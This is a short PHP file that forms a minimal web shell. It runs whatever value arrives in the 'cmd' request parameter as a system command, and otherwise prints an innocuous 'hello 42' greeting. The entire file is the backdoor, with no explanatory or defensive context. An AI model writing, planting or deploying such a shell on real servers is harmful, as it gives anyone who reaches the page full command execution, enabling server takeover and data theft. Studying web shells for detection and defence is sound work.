<?php
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    system($cmd);
} else {
    echo "hello 42";
}
?>
